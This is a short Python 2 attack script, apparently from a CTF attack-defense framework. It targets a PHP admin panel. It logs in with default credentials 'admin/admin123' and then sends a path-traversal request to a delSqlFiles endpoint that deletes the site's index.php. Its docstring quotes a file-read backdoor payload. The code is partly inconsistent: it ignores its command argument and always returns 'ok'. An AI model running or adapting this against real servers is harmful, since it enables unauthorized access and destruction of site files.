#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''

    try:
        data = quote(cmd) 
        #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
	res = shit(target,target_port,data)
        if len(res) == 2:
            res = cmd_prefix + res + cmd_postfix
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res

def shit(target,target_port,cmd):
    s = requests.Session()
    ip = target
    headers = {"X-Requested-With": "XMLHttpRequest"}
    url_1 = 'http://%s:%s/index.php/admin/login/index.html' % (ip,str(target_port))
    print s.post(url_1,data={"username":"admin","password":"admin123","captcha":"a"},headers=headers).content
    url_2 = 'http://%s:%s/index.php/admin/Database/delSqlFiles?sqlfilename=../../index.php' % (ip,str(target_port))
    res =  s.get(url_2,headers=headers).content
    res = 'ok'
    


    return res
